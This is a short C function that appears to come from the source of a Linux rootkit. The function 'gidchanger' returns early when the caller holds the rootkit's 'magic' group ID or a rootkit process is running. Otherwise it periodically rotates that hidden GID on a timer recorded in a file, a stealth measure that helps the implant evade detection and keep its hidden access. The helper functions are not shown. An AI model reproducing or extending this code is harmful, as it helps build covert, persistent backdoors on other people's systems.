void gidchanger(void){
    gid_t magicgid = readgid();
    if(getuid() == magicgid || getgid() == magicgid || rkprocup())
        return;

    int curtime = time(NULL);
    if(itistime(GIDTIME_PATH, curtime, GID_CHANGE_MINTIME))
        if(writenewtime(GIDTIME_PATH, curtime))
            changerkgid();
}